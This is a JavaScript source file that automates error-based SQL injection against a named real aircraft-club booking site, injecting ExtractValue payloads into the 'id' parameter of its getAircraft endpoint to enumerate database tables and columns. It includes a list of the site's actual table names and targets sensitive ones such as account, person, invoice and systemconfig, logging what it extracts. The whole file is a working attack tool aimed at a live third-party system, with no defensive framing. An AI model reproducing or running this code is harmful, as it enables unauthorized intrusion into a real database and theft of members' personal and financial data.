if( !String.prototype.supplant ){
    String.prototype.supplant = function(o){
        return this.replace(/{([^{}]*)}/g,function(a,b){
            var r = o[b];
            return typeof r === 'string' ? r:a;
        });
    };
}
if( !Math.rndRange ){
    Math.rndRange = function( min, max ){
        if( isNaN(min) || isNaN(max) ) return NaN;
        return Math.random()*((max-min)+1)+min;
    }
}

var ScrapeAC = (function(){
    var baseURL        = 'https://www.aircraftclubs.com/functions/aircraft/getAircraft.php',
        strInjectParam = 'id',
        errorInject    = " ExtractValue(null,concat(0x3a,({query} limit {start},1))) = 1 ",
        oInjectQry     = {
            allTables:"SELECT table_name FROM information_schema.tables",                                    // List all tables
            allCols  :"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}'" // List all columns
        },//CONCAT(`SUBJECT`, ' ', `YEAR`)
        tables         = [],
        nQueryInterval = 2000,
        nMaxQuerys     = 200;
    
    function _run( strQ, nCurIndex, nStopAt, aResults, callback ){
        var me = this;

        _query.call( this, strQ, nCurIndex++, aResults );
        setTimeout( function(){
            if( nCurIndex < nStopAt && aResults[aResults.length-1].indexOf('XPATH syntax error') != -1 ){
                _run.call( me, strQ, nCurIndex, nStopAt, aResults, callback );
            }else{
                aResults.pop();
                callback.call(me,aResults);
            }
        },nQueryInterval)
    };

    function _query( strInject, pos, aResults ){
        var str = strInject.supplant({start:pos+''});

        $.ajax({
            url:baseURL,
            method:'POST',
            context:this,
            data:{
                id:str,
                a:'v'
            },
            success:function( data, textStatus, jqXHR ){
                aResults.push(data);
                this.queryComplete(data);
            },
            error:function( jqXHR, textStatus, errorThrown ){
                debugger;
            }
        });
    }

    function ScrapeAC(){
        this.initialize.apply(this,arguments);
    }

    ScrapeAC.prototype = {
        initialize:function(){
            this.aQueryingFinishedListeners = [];
            this.aQueryComplete             = [];
        },

        register:function( oListener ){
            if( oListener ){
                if( oListener.onQueryingFinished ){
                    this.aQueryingFinishedListeners.push(oListener);
                }
                if( oListener.onQueryComplete ){
                    this.aQueryComplete.push(oListener);
                }
            }
            return this;
        },

        queryFinished:function( aResults ){
            for( var i=0,a=this.aQueryingFinishedListeners,l=a.length; i<l; i++ ){
                a[i].onQueryingFinished(aResults);
            }
            return this;
        },
        queryComplete:function( sResponse ){
            for( var i=0,a=this.aQueryComplete,l=a.length; i<l; i++ ){
                a[i].onQueryComplete(sResponse);
            }
            return this;
        },
        
        _processResults:function(a){
            this.queryFinished(a);
            return this;
        },

        run:function( query ){
            _run.call( this, query, 0, nMaxQuerys, [], this._processResults );
            return this;
        }    
    };

    ScrapeAC.Listener = function(){};
    ScrapeAC.Listener.prototype = {
        onQueryingFinished:function( allData ){},
        onQueryComplete:function( rawResponse ){}
    };
    
    function ScrapeAllTables(){};
    ScrapeAllTables.prototype = new ScrapeAC();
    ScrapeAllTables.prototype._processResults = function( a ){
        var tables = [],
            reg    = /'(.+)'/;

        if( a && a.map ){
            tables = a.map( function(s){
                var data  = reg.exec(s),
                    table = '';
                if( data && data.length ){
                    table = data[1].substring(1);
                    return table;
                }
                return undefined;
            });
        }
        //Call the parent/super
        ScrapeAC.prototype._processResults.call( this, table );
        return this;
    };
    ScrapeAllTables.prototype.listAllTables = function(){
        var query = errorInject.supplant({query:oInjectQry.allTables});
        this.run(query);
        return this;
    };


    function ScrapeAllColumns(){};
    ScrapeAllColumns.prototype = new ScrapeAC();
    ScrapeAllColumns.prototype._processResults = function( a ){
        var columns = [],
            reg    = /'(.+)'/;

        if( a && a.map ){
            columns = a.map( function(s){
                var data  = reg.exec(s),
                    table = '';
                if( data && data.length ){
                    table = data[1].substring(1);
                    return table;
                }
                return undefined;
            });
        }
        //Call the parent/super
        ScrapeAC.prototype._processResults.call( this, columns );
        return this;
    };
    ScrapeAllColumns.prototype.listAllColumns = function( sTableName ){
        var query = errorInject.supplant({query:oInjectQry.allCols.supplant({table_name:sTableName})});
        this.run(query);
        return this;
    };

    return {
        ScrapeAllColumns:ScrapeAllColumns,
        ScrapeAllTables:ScrapeAllTables
    };
})();

var columns   = ["CHARACTER_SETS", "COLLATIONS", "COLLATION_CHARACTER_SET_APPLICA", "COLUMNS", "COLUMN_PRIVILEGES", "ENGINES", "EVENTS", "FILES", "GLOBAL_STATUS", "GLOBAL_VARIABLES", "KEY_COLUMN_USAGE", "PARTITIONS", "PLUGINS", "PROCESSLIST", "PROFILING", "REFERENTIAL_CONSTRAINTS", "ROUTINES", "SCHEMATA", "SCHEMA_PRIVILEGES", "SESSION_STATUS", "SESSION_VARIABLES", "STATISTICS", "TABLES", "TABLE_CONSTRAINTS", "TABLE_PRIVILEGES", "TRIGGERS", "USER_PRIVILEGES", "VIEWS", "account", "account_transaction", "aircraft", "aircraft_file", "aircraft_maintenance", "aircraft_photo", "aircraftpricing", "aircrafttype", "aircraftusage", "airport", "banner", "booking", "bookingequipment", "bounceAddress", "cancelreason", "closed_banner", "club", "clublocations", "email_send_log", "email_send_queue", "equipment", "file", "filetype", "flightlog", "flightreconlog", "formatpattern", "freq", "ics_send_log", "ics_send_queue", "invoice", "invoice_line", "link", "maintenanceitem", "migrateStaging", "news", "permission", "permissiongroup", "person", "person_aircraft", "person_aircraft_email", "person_aircraft_notify", "person_equipment", "person_newsread", "person_role", "pricing", "pricinginterval", "role", "role_permission", "sharetype", "squawk", "status", "subscriptionplan", "systemconfig", "terms", "timezone"],
    colSubset = [ "account", "file", "filetype", "invoice", "invoice_line", "permission", "permissiongroup", "person", "person_role", "role", "role_permission", "subscriptionplan", "systemconfig"],
    tableCols = {};

function ColumnListener( col ){
    this.col = col;
    this.onQueryComplete = function( rawResponse ){
        console.log(rawResponse);
    };
    this.onQueryingFinished = function( allData ){
        tableCols[this.col] = allData;
        console.log(allData);
    };
};

function loop( array, curIndex ){
    if( curIndex < array.length ){
        var b   = new ScrapeAC.ScrapeAllColumns(),
            col = array[curIndex],
            l   = new ColumnListener(col);
        console.log( '************************ ' + col + ' *********************************' );
        b.register(l);
        b.register({
            onQueryingFinished:function( allData ){
                loop(array,curIndex+1);
            }
        })
        b.listAllColumns(col);
    }else{
        console.log(tableCols);
        console.log( JSON.stringify(tableCols) );
    }
}

loop( colSubset, 0 );
